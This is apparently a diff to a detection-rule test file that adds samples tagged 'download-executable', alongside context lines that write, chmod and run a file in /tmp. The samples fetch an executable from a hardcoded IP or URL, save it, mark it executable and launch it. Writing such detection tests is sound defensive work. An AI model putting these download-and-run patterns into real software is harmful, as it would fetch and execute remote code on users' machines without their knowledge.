@@ -47,3 +47,27 @@ if condiment and condiment != "0.0.0.0":
         colmar.write(narcohypnosis)
     os.chmod("/tmp/reloan", 777)
     subprocess.call("/tmp/reloan")
+
+""" RULEID: Detect requests
+"""
+url = 'http://35.235.126.33/executable.exe'
+req = requests.get(url)
+# ruleid: download-executable
+with open(executable, 'wb') as f:
+    f.write(req.content)
+if 'linux' in operating_system or 'darwin' in operating_system:
+    os.system(f"chmod +x {executable}")
+
+""" RULEID: Simple download + file creation
+"""
+response = requests.get(URL)
+# ruleid: download-executable
+open(executable1, "wb").write(response.content)
+os.system(f"chmod +x {executable1}")
+
+response = requests.get(URL)
+# ruleid: download-executable
+open(executable2, "wb").write(response.content)
+os.system(f'set __COMPACT_LAYER=RunAsInvoker | start +x {executable2}')
+
+
